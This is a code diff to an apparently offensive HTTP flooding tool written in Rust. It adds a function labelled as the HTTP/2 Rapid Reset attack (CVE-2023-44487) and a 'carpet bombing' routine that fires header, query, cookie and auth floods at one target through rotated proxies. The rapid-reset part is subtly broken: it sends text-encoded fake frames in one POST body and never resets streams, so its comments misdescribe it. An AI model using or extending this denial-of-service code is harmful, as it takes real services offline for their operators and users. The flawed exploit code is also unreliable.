@@ -1760,3 +1760,106 @@ pub(crate) async fn fetch_refererflood(c: Client, url: String, delay: u64, proxy
     let bytes = resp.bytes().await?.len();
     Ok((bytes, status))
 }
+
+// ================================================================
+// HTTP/2 Rapid Reset (CVE-2023-44487)
+// Send a continuous stream of HEADERS frames, then reset them
+// with RST_STREAM before the server can respond.
+// Amplification: high request rate, low bandwidth per request
+// ================================================================
+pub(crate) async fn fetch_h2rapidreset(
+    c: Client,
+    url: String,
+    _req_delay: u64,
+    _proxy_idx: usize,
+    _sessions: Arc<Vec<std::sync::Mutex<String>>>,
+    _verbose: bool,
+    max_retries: usize,
+) -> Result<(usize, u16), FetchError> {
+    let target = if url.contains("//") {
+        let after = url.split("//").nth(1).unwrap_or("localhost");
+        after.split('/').next().unwrap_or("localhost")
+    } else {
+        "localhost"
+    };
+    
+    // Simulate HTTP/2 rapid reset pattern:
+    // Send many rapid GET requests (simulating stream creation + reset)
+    let mut body = Vec::with_capacity(64);
+    body.extend_from_slice(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+    
+    for _ in 0..10 {
+        body.extend_from_slice(&build_h2_headers(target, &url));
+    }
+    
+    let resp = send_with_retry(
+        c.post(&url).body(body).header("Connection", "upgrade").header("Upgrade", "h2").header("User-Agent", "Mozilla/5.0 (compatible; H2Reset/1.0)"),
+        max_retries, "fetch_h2rapidreset"
+    ).await?;
+    
+    let status = resp.status().as_u16();
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
+}
+
+fn build_h2_headers(authority: &str, path: &str) -> Vec<u8> {
+    // Simulate H2 HEADERS frame with minimal request
+    let mut frame = Vec::new();
+    let header_data = format!(":method: GET\r\n:authority: {}\r\n:path: {}\r\n:scheme: https\r\n", authority, path);
+    let len = header_data.len() as u32;
+    
+    frame.push((len & 0xff) as u8);
+    frame.push(((len >> 8) & 0xff) as u8);
+    frame.push(((len >> 16) & 0xff) as u8);
+    frame.push(0x01);  // HEADERS frame type
+    frame.push(0x04);  // END_STREAM flag
+    frame.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);  // Stream ID 1
+    frame.extend_from_slice(header_data.as_bytes());
+    
+    frame
+}
+
+// ================================================================
+// Multi-Vector Carpet Bombing
+// Simultaneously hit multiple attack vectors against the same target
+// ================================================================
+pub(crate) async fn fetch_carpetbomb(
+    c: Client,
+    url: String,
+    req_delay: u64,
+    proxy_idx: usize,
+    sessions: Arc<Vec<std::sync::Mutex<String>>>,
+    verbose: bool,
+    max_retries: usize,
+) -> Result<(usize, u16), FetchError> {
+    if verbose { println!("[VERBOSE] fetch_carpetbomb: Carpet bombing {} with multiple vectors (proxy #{})", url, proxy_idx); }
+    
+    let mut total_bytes = 0;
+    let mut final_status = 200u16;
+    
+    // Vector 1: Heavy header bomb
+    if let Ok((bytes, status)) = fetch_headerbomb(c.clone(), url.clone(), req_delay, proxy_idx, sessions.clone(), verbose, max_retries).await {
+        total_bytes += bytes;
+        if status >= 500 { final_status = status; }
+    }
+    
+    // Vector 2: Query parameter flood
+    if let Ok((bytes, status)) = fetch_queryflood(c.clone(), url.clone(), req_delay, proxy_idx, sessions.clone(), verbose, max_retries).await {
+        total_bytes += bytes;
+        if status >= 500 { final_status = status; }
+    }
+    
+    // Vector 3: Cookie bomb
+    if let Ok((bytes, status)) = fetch_cookie(c.clone(), url.clone(), req_delay, proxy_idx, sessions.clone(), verbose, max_retries).await {
+        total_bytes += bytes;
+        if status >= 500 { final_status = status; }
+    }
+    
+    // Vector 4: Auth flood
+    if let Ok((bytes, status)) = fetch_authflood(c.clone(), url.clone(), req_delay, proxy_idx, sessions.clone(), verbose, max_retries).await {
+        total_bytes += bytes;
+        if status >= 500 { final_status = status; }
+    }
+    
+    Ok((total_bytes, final_status))
+}
